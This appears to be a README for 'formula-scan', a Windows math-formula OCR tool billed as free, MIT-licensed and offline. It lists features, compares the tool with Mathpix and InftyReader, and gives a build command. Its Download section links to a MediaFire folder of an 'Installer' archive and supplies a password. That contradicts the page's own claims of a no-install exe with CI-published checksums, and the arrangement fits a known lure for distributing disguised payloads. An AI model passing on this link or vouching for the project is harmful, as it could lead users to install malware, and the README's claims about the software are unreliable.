# formula-scan

➗ Free, open-source math OCR for Windows — photos of formulas and handwriting to LaTeX offline. 100 MB portable, MIT, no page limits.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Formula to LaTeX** — photograph an equation and get editable LaTeX in the clipboard
- ✅ **Handwritten support** — lecture notes and whiteboard scribbles recognized, not just printed print
- ✅ **Live render preview** — see the typeset formula beside the photo to catch recognition mistakes
- ✅ **Batch pages** — a folder of note photos converted into one .tex document with page separators
- ✅ **MathML and plain-text output** — for Word, web and script consumers, not just LaTeX users
- ✅ **Correction pass** — nudge individual symbols the model got wrong with a symbol keyboard
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why formula-scan

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **formula-scan** | Mathpix | InftyReader | Manual typing |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid per month | Paid | Your time |
| Open source | **Yes** | No | No | N/A
| Unmetered use | **Yes** | Snip limits | License | N/A
| Photos stay local | **Yes** | Upload | Yes | N/A
| Batch pages to one .tex | **Yes** | Partial | Partial | Manual
| Portable, no install | **Yes, 100 MB** | App and web | Installer | N/A

## FAQ

**convert photos of math formulas to LaTeX offline and for free?**

Mathpix is good and charges monthly with uploads, and hand-typing equations is the most expensive option of all. formula-scan recognizes printed and handwritten math locally, previews the typeset result and exports LaTeX or MathML. It is a 100 MB portable exe, MIT, no page limits.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark recognizer (#121418, green #22C55E): photo of a handwritten integral left, rendered LaTeX right in matching layout, confidence chip at 0.96.
2. Correction pass: symbol grid under the formula with two items highlighted amber, symbol keyboard panel below, apply button enabled.
3. Batch pages: 34 note photos listed with recognition status, single .tex output checkbox checked, progress bar at 22 of 34, format dropdown reading LaTeX.

## Download

| Source | Link |
|---|---|
| 💾 **Installer formula-scan** | [Installer formula-scan](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).